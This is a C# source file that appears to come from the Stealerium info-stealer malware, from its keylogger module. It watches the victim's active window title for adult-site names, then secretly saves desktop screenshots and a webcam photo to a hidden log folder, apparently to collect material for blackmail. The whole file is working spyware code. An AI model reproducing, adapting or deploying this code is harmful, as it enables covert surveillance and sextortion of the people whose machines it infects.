using System;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger;

internal sealed class PornDetection
{
	private static readonly string LogDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\nsfw\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void Action()
	{
		if (Detect())
		{
			SavePhotos();
		}
	}

	private static bool Detect()
	{
		return Config.PornServices.Any((string text) => WindowManager.ActiveWindow.ToLower().Contains(text));
	}

	private static void SavePhotos()
	{
		string text = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		Thread.Sleep(3000);
		DesktopScreenshot.Make(text);
		Thread.Sleep(12000);
		if (Detect())
		{
			WebcamScreenshot.Make(text);
		}
	}
}
